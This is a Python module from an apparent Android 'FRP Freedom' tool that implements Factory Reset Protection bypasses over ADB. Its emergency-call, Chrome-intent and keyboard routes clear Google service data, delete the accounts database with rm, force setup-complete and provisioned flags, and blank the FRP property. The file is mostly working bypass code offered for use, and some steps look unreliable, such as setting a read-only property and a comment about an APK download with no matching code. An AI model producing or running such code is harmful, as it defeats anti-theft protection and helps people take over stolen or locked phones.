#!/usr/bin/env python3
"""
Interface Exploits for FRP Freedom
Implements UI-based bypass methods including emergency call and intent manipulation
"""

import logging
import time
from typing import Dict, Any, Callable, List

from ..core.device_manager import DeviceInfo, DeviceManager
from .types import BypassResult

class InterfaceExploitManager:
    """Manages interface-based FRP bypass exploits"""
    
    def __init__(self, config, device_manager: DeviceManager):
        self.config = config
        self.device_manager = device_manager
        self.logger = logging.getLogger(__name__)
    
    def emergency_call_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Exploit emergency call interface to access settings"""
        try:
            progress_callback("Starting emergency call exploit", 30)
            
            # Step 1: Access emergency call interface
            if not self._access_emergency_call(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to access emergency call interface',
                    'details': {}
                }
            
            progress_callback("Navigating through emergency interface", 50)
            
            # Step 2: Navigate to settings through emergency call
            if not self._emergency_navigate_to_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to navigate to settings via emergency call',
                    'details': {}
                }
            
            progress_callback("Bypassing FRP through settings", 70)
            
            # Step 3: Bypass FRP through accessed settings
            if not self._bypass_frp_via_emergency_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to bypass FRP via emergency settings',
                    'details': {}
                }
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'Emergency call exploit completed successfully',
                'details': {'method': 'emergency_call_exploit'}
            }
        
        except Exception as e:
            self.logger.error(f"Emergency call exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Emergency call exploit error: {str(e)}',
                'details': {'exception': str(e)}
            }
    
    def chrome_intent_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Use Chrome browser intent to bypass setup"""
        try:
            progress_callback("Starting Chrome intent exploit", 30)
            
            # Step 1: Launch Chrome via intent
            if not self._launch_chrome_via_intent(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to launch Chrome via intent',
                    'details': {}
                }
            
            progress_callback("Exploiting Chrome browser", 50)
            
            # Step 2: Use Chrome to access system settings
            if not self._chrome_access_system_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to access system settings via Chrome',
                    'details': {}
                }
            
            progress_callback("Disabling FRP", 70)
            
            # Step 3: Disable FRP through Chrome-accessed settings
            if not self._disable_frp_via_chrome(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to disable FRP via Chrome',
                    'details': {}
                }
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'Chrome intent exploit completed successfully',
                'details': {'method': 'chrome_intent_exploit'}
            }
        
        except Exception as e:
            self.logger.error(f"Chrome intent exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Chrome intent exploit error: {str(e)}',
                'details': {'exception': str(e)}
            }
    
    def keyboard_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Exploit keyboard interface to access settings"""
        try:
            progress_callback("Starting keyboard exploit", 30)
            
            # Step 1: Access keyboard settings
            if not self._access_keyboard_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to access keyboard settings',
                    'details': {}
                }
            
            progress_callback("Navigating through keyboard interface", 50)
            
            # Step 2: Navigate to system settings via keyboard
            if not self._keyboard_navigate_to_system(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to navigate to system via keyboard',
                    'details': {}
                }
            
            progress_callback("Bypassing FRP", 70)
            
            # Step 3: Bypass FRP
            if not self._bypass_frp_via_keyboard(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to bypass FRP via keyboard',
                    'details': {}
                }
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'Keyboard exploit completed successfully',
                'details': {'method': 'keyboard_exploit'}
            }
        
        except Exception as e:
            self.logger.error(f"Keyboard exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Keyboard exploit error: {str(e)}',
                'details': {'exception': str(e)}
            }
    
    def _access_emergency_call(self, device: DeviceInfo) -> bool:
        """Access emergency call interface"""
        try:
            # Method 1: Use emergency call intent
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.CALL_EMERGENCY'
                ]
            )
            
            if success:
                time.sleep(2)
                return True
            
            # Method 2: Simulate emergency call access
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'input', 'keyevent', 'KEYCODE_CALL'
                ]
            )
            
            if success:
                time.sleep(2)
                return True
            
            # Method 3: Access via dialer
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.DIAL'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error accessing emergency call: {e}")
            return False
    
    def _emergency_navigate_to_settings(self, device: DeviceInfo) -> bool:
        """Navigate to settings through emergency call interface"""
        try:
            # Simulate emergency number input that triggers settings
            emergency_sequences = [
                '*#*#4636#*#*',  # Testing menu
                '*#*#8255#*#*',  # Google Talk service monitor
                '*#*#232338#*#*',  # WiFi MAC address
                '*#*#1472365#*#*'  # GPS test
            ]
            
            for sequence in emergency_sequences:
                # Input the sequence
                for char in sequence:
                    if char == '*':
                        keycode = 'KEYCODE_STAR'
                    elif char == '#':
                        keycode = 'KEYCODE_POUND'
                    else:
                        keycode = f'KEYCODE_{char}'
                    
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, ['shell', 'input', 'keyevent', keycode]
                    )
                    
                    if not success:
                        continue
                    
                    time.sleep(0.1)
                
                time.sleep(2)
                
                # Check if settings opened
                success, output = self.device_manager.execute_adb_command(
                    device.serial, ['shell', 'dumpsys', 'activity', 'activities']
                )
                
                if success and 'settings' in output.lower():
                    return True
            
            # Alternative method: Use emergency call to access contacts, then settings
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                    '-t', 'vnd.android.cursor.dir/contact'
                ]
            )
            
            if success:
                time.sleep(2)
                
                # Try to access settings from contacts
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'am', 'start', '-a', 'android.settings.SETTINGS'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error navigating to settings via emergency: {e}")
            return False
    
    def _bypass_frp_via_emergency_settings(self, device: DeviceInfo) -> bool:
        """Bypass FRP through emergency-accessed settings"""
        try:
            # Clear Google account data
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'pm', 'clear', 'com.google.android.gms'
                ]
            )
            
            if not success:
                return False
            
            time.sleep(2)
            
            # Remove accounts database
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'rm', '/data/system/users/0/accounts.db'
                ]
            )
            
            if success:
                # Set device as provisioned
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error bypassing FRP via emergency settings: {e}")
            return False
    
    def _launch_chrome_via_intent(self, device: DeviceInfo) -> bool:
        """Launch Chrome browser via intent"""
        try:
            # Method 1: Direct Chrome launch
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-n',
                    'com.android.chrome/com.google.android.apps.chrome.Main'
                ]
            )
            
            if success:
                time.sleep(3)
                return True
            
            # Method 2: Launch via web intent
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                    '-d', 'http://www.google.com'
                ]
            )
            
            if success:
                time.sleep(3)
                return True
            
            # Method 3: Launch browser via category
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                    '-c', 'android.intent.category.BROWSABLE',
                    '-d', 'https://www.google.com'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error launching Chrome via intent: {e}")
            return False
    
    def _chrome_access_system_settings(self, device: DeviceInfo) -> bool:
        """Access system settings through Chrome browser"""
        try:
            # Navigate to settings URL
            settings_urls = [
                'content://settings/system',
                'content://settings/secure',
                'content://settings/global'
            ]
            
            for url in settings_urls:
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                        '-d', url
                    ]
                )
                
                if success:
                    time.sleep(2)
                    
                    # Check if settings opened
                    success, output = self.device_manager.execute_adb_command(
                        device.serial, ['shell', 'dumpsys', 'activity', 'activities']
                    )
                    
                    if success and 'settings' in output.lower():
                        return True
            
            # Alternative: Use Chrome to download and open settings APK
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.SETTINGS'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error accessing system settings via Chrome: {e}")
            return False
    
    def _disable_frp_via_chrome(self, device: DeviceInfo) -> bool:
        """Disable FRP through Chrome-accessed settings"""
        try:
            # Method 1: Clear Google services
            google_packages = [
                'com.google.android.gms',
                'com.google.android.gsf',
                'com.google.android.setupwizard'
            ]
            
            for package in google_packages:
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, ['shell', 'pm', 'clear', package]
                )
                
                if success:
                    time.sleep(1)
            
            # Method 2: Modify settings
            settings_commands = [
                ['shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'],
                ['shell', 'settings', 'put', 'system', 'device_provisioned', '1'],
                ['shell', 'settings', 'put', 'global', 'device_provisioned', '1']
            ]
            
            for cmd in settings_commands:
                success, _ = self.device_manager.execute_adb_command(device.serial, cmd)
                if success:
                    time.sleep(1)
            
            # Method 3: Remove FRP flag
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'setprop', 'ro.frp.pst', ''
                ]
            )
            
            return True
        
        except Exception as e:
            self.logger.error(f"Error disabling FRP via Chrome: {e}")
            return False
    
    def _access_keyboard_settings(self, device: DeviceInfo) -> bool:
        """Access keyboard settings interface"""
        try:
            # Method 1: Launch input method settings
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.INPUT_METHOD_SETTINGS'
                ]
            )
            
            if success:
                time.sleep(2)
                return True
            
            # Method 2: Launch language settings
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.LOCALE_SETTINGS'
                ]
            )
            
            if success:
                time.sleep(2)
                return True
            
            # Method 3: Access via text input
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'input', 'text', 'test'
                ]
            )
            
            if success:
                # Long press to access keyboard settings
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'input', 'keyevent', '--longpress', 'KEYCODE_MENU'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error accessing keyboard settings: {e}")
            return False
    
    def _keyboard_navigate_to_system(self, device: DeviceInfo) -> bool:
        """Navigate to system settings via keyboard interface"""
        try:
            # From keyboard settings, try to access main settings
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.SETTINGS'
                ]
            )
            
            if success:
                time.sleep(2)
                return True
            
            # Alternative: Use keyboard shortcut
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'input', 'keyevent', 'KEYCODE_MENU'
                ]
            )
            
            if success:
                time.sleep(1)
                
                # Navigate to settings
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'input', 'keyevent', 'KEYCODE_DPAD_DOWN'
                    ]
                )
                
                if success:
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, [
                            'shell', 'input', 'keyevent', 'KEYCODE_ENTER'
                        ]
                    )
                    
                    return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error navigating to system via keyboard: {e}")
            return False
    
    def _bypass_frp_via_keyboard(self, device: DeviceInfo) -> bool:
        """Bypass FRP through keyboard-accessed settings"""
        try:
            # Similar to other methods, clear Google services
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'pm', 'clear', 'com.google.android.gms'
                ]
            )
            
            if not success:
                return False
            
            # Set completion flags
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error bypassing FRP via keyboard: {e}")
            return False
    
    def send_intent_sequence(self, device: DeviceInfo, intents: List[Dict[str, str]]) -> bool:
        """Send a sequence of intents to the device"""
        try:
            for intent in intents:
                cmd = ['shell', 'am', 'start']
                
                if 'action' in intent:
                    cmd.extend(['-a', intent['action']])
                
                if 'data' in intent:
                    cmd.extend(['-d', intent['data']])
                
                if 'category' in intent:
                    cmd.extend(['-c', intent['category']])
                
                if 'component' in intent:
                    cmd.extend(['-n', intent['component']])
                
                if 'extras' in intent:
                    for key, value in intent['extras'].items():
                        cmd.extend(['--es', key, value])
                
                success, _ = self.device_manager.execute_adb_command(device.serial, cmd)
                
                if not success:
                    return False
                
                time.sleep(intent.get('delay', 1))
            
            return True
        
        except Exception as e:
            self.logger.error(f"Error sending intent sequence: {e}")
            return False
    
    def simulate_ui_interaction(self, device: DeviceInfo, interactions: List[Dict[str, Any]]) -> bool:
        """Simulate UI interactions on the device"""
        try:
            for interaction in interactions:
                interaction_type = interaction.get('type')
                
                if interaction_type == 'tap':
                    x, y = interaction['coordinates']
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, ['shell', 'input', 'tap', str(x), str(y)]
                    )
                
                elif interaction_type == 'swipe':
                    x1, y1, x2, y2 = interaction['coordinates']
                    duration = interaction.get('duration', 300)
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, [
                            'shell', 'input', 'swipe', str(x1), str(y1), str(x2), str(y2), str(duration)
                        ]
                    )
                
                elif interaction_type == 'key':
                    keycode = interaction['keycode']
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, ['shell', 'input', 'keyevent', keycode]
                    )
                
                elif interaction_type == 'text':
                    text = interaction['text']
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, ['shell', 'input', 'text', f'"{text}"']
                    )
                
                else:
                    continue
                
                if not success:
                    return False
                
                time.sleep(interaction.get('delay', 0.5))
            
            return True
        
        except Exception as e:
            self.logger.error(f"Error simulating UI interaction: {e}")
            return False